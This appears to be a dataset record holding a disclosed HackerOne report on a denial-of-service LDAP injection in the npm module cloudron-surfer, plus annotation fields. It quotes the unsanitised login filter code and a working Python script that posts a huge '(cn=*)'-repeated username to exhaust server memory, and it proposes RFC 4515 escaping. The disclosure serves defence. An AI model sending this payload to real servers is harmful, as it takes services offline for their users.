{
  "reported_to": "Node.js third-party modules",
  "reported_by": "d3lla ",
  "title": "[cloudron-surfer] Denial of Service via LDAP Injection",
  "content": "\nI would like to report Denial of service via LDAP Injection vulnerability in cloudron-surfer module.\nIt allows a malicious attacker to send a malformed input that is interpreted as an LDAP filter, leading to Denial of Service.\nModule\nmodule name: cloudron-surfer\nversion: 5.9.0\nnpm page: https://www.npmjs.com/package/cloudron-surfer\nModule Description\nSurfer is a Simple static file server. It comes with a commandline tool to upload files from your local folders and a webinterface to manage files directly on the server.\nModule Stats\n[4] weekly downloads\nVulnerability\nVulnerability Description\nThe module is vulnerable to a DoS via LDAP Injection.\nLDAP injection is a particular case of Injection vulnerabilities that occurs when user controlled input not properly sanitized is used to build LDAP filter.\nThis could lead to modification of LDAP statements performed. Depending on the application, this could lead to an authentication bypass, information disclosure or DoS.\nThe problem arises during the login phase. User controlled input username is used to build a LDAP filter without any sanitization.\nThe filter uses an OR operation between different attributes that are uid, mail, username, sAMAccountName.\nThe search returns all the users whose one of the attributes above has value username. Then it takes the first and match with the password provided using a bind operation.\nThe problem occurs when the username contains valid LDAP character filters, like for example * (the filter (cn=*) is a presence filter that will match any entry with one or more values for the cn attribute), that could change the LDAP statement.\nIf an attacker provides as username the value *, this will result in the following filter:\n(|(uid=*)(mail=*)(username=*)(sAMAccountName=*)).\nIn order for an attacker to perform a DoS, he/she has to build a filter that will take long time to be evaluated.\nFor example, if the attacker provides the following payload *)(cn=*)(cn=*, this will result in the following filter:\n(|(uid=*)(cn=*)(cn=*)(mail=*)(cn=*)(cn=*)(username=*)(cn=*)(cn=*)(sAMAccountName=*)(cn=*)(cn=*)).\nIf instead of *)(cn=*)(cn=*, an attacker repeat the middle (cn=*) thousand of times, this will result in a huge filter that will take a huge amount of time to be evaluated, leading to DoS.\nBelow the vulnerable code:\nCode 2.24 KiB\n1// https://github.com/nebulade/surfer/blob/master/src/auth.js#L72\n2// https://git.cloudron.io/cloudron/surfer/-/blob/master/src/auth.js#L74\n3....\n4\n5function verifyUser(username, password, callback) {\n6    if (AUTH_METHOD === 'ldap') {\n7        var ldapClient = ldapjs.createClient({ url: process.env.CLOUDRON_LDAP_URL });\n8        ldapClient.on('error', function (error) {\n9            console.error('LDAP error', error);\n10        });\n11\n12        ldapClient.bind(process.env.CLOUDRON_LDAP_BIND_DN, process.env.CLOUDRON_LDAP_BIND_PASSWORD, function (error) {\n13            if (error) return callback(error);\n14\n15            var filter = `(|(uid=${username})(mail=${username})(username=${username})(sAMAccountName=${username}))`; //<-- INJECTION: username is not sanitized\n16            ldapClient.search(process.env.CLOUDRON_LDAP_USERS_BASE_DN, { filter: filter }, function (error, result) {\n17                if (error) return callback(error);\n18\n19                var items = [];\n20\n21                result.on('searchEntry', function(entry) { items.push(entry.object); });\n22                result.on('error', callback);\n23                result.on('end', function (result) {\n24                    if (result.status !== 0 || items.length === 0) return callback('Invalid credentials');\n25\n26                    // pick the first found\n27                    var user = items[0];\n28\n29                    ldapClient.bind(user.dn, password, function (error) {\n30                        if (error) return callback('Invalid credentials');\n31\n32                        callback(null, { username: username });\n33                    });\n34                });\n35            });\n36        });\n37    }\n38...\n39\n40// https://github.com/nebulade/surfer/blob/master/src/auth.js#L107\n41// https://git.cloudron.io/cloudron/surfer/-/blob/master/src/auth.js#L113\n42exports.login = function (req, res, next) {\n43    verifyUser(req.body.username, req.body.password, function (error, user) { //<-- USER CONTROLLED INPUT\n44        if (error) return next(new HttpError(401, 'Invalid credentials'));\n45\n46        var accessToken = LOGIN_TOKEN_PREFIX + uuid();\n47\n48        tokenStore.set(accessToken, user, function (error) {\n49            if (error) return next(new HttpError(500, error));\n50\n51            next(new HttpSuccess(201, { accessToken: accessToken, user: user }));\n52        });\n53    });\n54};\n55\nCode 183 Bytes\n1// https://github.com/nebulade/surfer/blob/master/server.js#L76\n2// https://git.cloudron.io/cloudron/surfer/-/blob/master/server.js#L75\n3...\n4router.post  ('/api/login', auth.login);\n5...\nSteps To Reproduce:\nTo test this app on a real live system, you need first to install Cloudron (https://cloudron.io/get.html) and then install the Surfer app (https://cloudron.io/store/io.cloudron.surfer.html). In order to install the Cloudron app you need first a domain. In this case the web interface is available under the https://[appdomain]/_admin/ location.\nIstead of the above setting, I tested the app locally.\nBelow steps to reproduce the vulnerability.\nAs mentioned in another project (https://github.com/nebulade/meemo#development ), to simulate a LDAP server for users authentication, I used a test server provided by the same author (https://github.com/nebulade/ldapjstestserver). (you can find attached).\ncreate a directory for testing\nmkdir poc\ncd poc/\nmkdir poc\ncd poc/\ninstall cloudron-surfer module:\nnpm i cloudron-surfer\nnpm i cloudron-surfer\nstart the LDAP test server:\nnode ldapjstestserver.js\nnode ldapjstestserver.js\nstart the surfer app locally (we need to setup some enviroment variables to enable the LDAP authentication):\nCLOUDRON_LDAP_BIND_DN=\"cn=admin,ou=users,dc=example\" CLOUDRON_LDAP_BIND_PASSWORD=\"password\" CLOUDRON_LDAP_USERS_BASE_DN=\"ou=users,dc=example\" CLOUDRON_LDAP_URL=\"ldap://localhost:3002\" node node_modules/cloudron-surfer/server.js\nCLOUDRON_LDAP_BIND_DN=\"cn=admin,ou=users,dc=example\" CLOUDRON_LDAP_BIND_PASSWORD=\"password\" CLOUDRON_LDAP_USERS_BASE_DN=\"ou=users,dc=example\" CLOUDRON_LDAP_URL=\"ldap://localhost:3002\" node node_modules/cloudron-surfer/server.js\nBefore performing the attack let's first check that everything works as expected:\nvisit http://localhost:3000/_admin/\nenter normal and test respectively in the username and password fields and the click enter\nlogout\nBefore performing the attack let's first check that everything works as expected even with a long value for username:\nvisit http://localhost:3000/_admin/\nrun the following python script (run_safe.py):\nCode 281 Bytes\n1import requests\n2\n3url = 'http://localhost:3000/api/login'\n4\n5payload =  \"a\"*(len(\"*)\") + len(\"(cn=*)\")*700000 + len(\"(cn=*\"))\n6\n7print(f\"Payload's length: {len(payload)} characters\")\n8\n9data = {\n10    'username': payload,\n11    'password': 'pass'\n12}\n13\n14response = requests.post(url, data = data)\nenter normal and test respectively in the username and password fields and the click enter\nlogout\nReproduce the attack:\nvisit http://localhost:3000/_admin/\nrun the following python script (run.py):\nCode 259 Bytes\n1import requests\n2\n3url = 'http://localhost:3000/api/login'\n4\n5payload = \"*)\" + \"(cn=*)\"*700000 + \"(cn=*\"\n6\n7print(f\"Payload's length: {len(payload)} characters\")\n8\n9data = {\n10    'username': payload,\n11    'password': 'pass'\n12}\n13\n14response = requests.post(url, data = data)\nthe page will load until the server crashes. After some time you will get the following error: FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory\nIf an attacker send one (like in my case) or multiple requests like in the previous example, he/she could potentially makes the service unavaible and consumes all the server resources, leading to DoS.\nPatch\nSanitize the user input before using it to build LDAP filters.\nPossible solution could be for example this one (taken from another project):\nGithub Issue: Vulnerable to ldap injection\nGithub Commit: Sanitize user input: Replace the specific special characters with codes as defined in LDAP specification.\nInspired by the same issue (https://github.com/vesse/node-ldapauth-fork/issues/21), here there are the RFC specifications (https://tools.ietf.org/search/rfc4515#section-3 ):\nCode 1.58 KiB\n1    The rule ensures that the entire filter string is a\n2    valid UTF-8 string and provides that the octets that represent the\n3    ASCII characters \"*\" (ASCII 0x2a), \"(\" (ASCII 0x28), \")\" (ASCII\n4    0x29), \"\" (ASCII 0x5c), and NUL (ASCII 0x00) are represented as a\n5    backslash \"\" (ASCII 0x5c) followed by the two hexadecimal digits\n6    representing the value of the encoded octet.\n7\n8    This simple escaping mechanism eliminates filter-parsing ambiguities\n9    and allows any filter that can be represented in LDAP to be\n10    represented as a NUL-terminated string. Other octets that are part\n11    of the set may be escaped using this mechanism, for example,\n12    non-printing ASCII characters.\n13\n14    For AssertionValues that contain UTF-8 character data, each octet of\n15    the character to be escaped is replaced by a backslash and two hex\n16    digits, which form a single octet in the code of the character. For\n17    example, the filter checking whether the \"cn\" attribute contained a\n18    value with the character \"\" anywhere in it would be represented as\n19    \"(cn=\\2a*)\".\n20\n21    As indicated by the rule, implementations MUST escape\n22    all octets greater than 0x7F that are not part of a valid UTF-8\n23    encoding sequence when they generate a string representation of a\n24    search filter. Implementations SHOULD accept as input strings that\n25    are not valid UTF-8 strings. This is necessary because RFC 2254 did\n26    not clearly define the term \"string representation\" (and in\n27    particular did not mention that the string representation of an LDAP\n28    search filter is a string of UTF-8-encoded Unicode characters).\nSupporting Material/References:\nSome helpful resources I used for this research:\nLDAP injection\nLDAP Filters\nBlackHat: LDAP Injection & Blind LDAP Injection\nUnderstanding and Defending Against LDAP Injection Attacks\nLDAP Injection Prevention Cheat Sheet\nLdapjs - orfilter\nMy setup:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v14.2.0\nNPM VERSION: 6.14.4\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nDenial of service\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "LDAP Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1598100480,
  "report_url": "https://hackerone.com/reports/906959",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Install Cloudron and the Surfer app or set up a local test environment with the cloudron-surfer module and LDAP test server."
    ],
    [
      2,
      "Send a crafted LDAP injection payload (e.g., '*)(cn=*)' repeated multiple times) as the username during login to trigger a Denial of Service."
    ]
  ],
  "vuln_description": "The cloudron-surfer module is vulnerable to a Denial of Service via LDAP Injection. An attacker can send a malformed input that is interpreted as an LDAP filter, leading to excessive resource consumption and server crashes.",
  "reason": "The vulnerability involves understanding LDAP injection techniques and crafting a payload that exploits the lack of input sanitization in the LDAP filter construction. However, the attack is straightforward once the LDAP injection vector is identified.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves LDAP injection during the login phase where user-controlled input is used to construct an LDAP filter without sanitization. The proposed methodologies focus on testing authorization boundaries by swapping user sessions and resource IDs, but this specific vulnerability is about input sanitization and filter construction, which is not directly covered by the described methodologies. The attack vector is through crafted input rather than session or resource ID manipulation.",
    "is_detectable": false
  }
}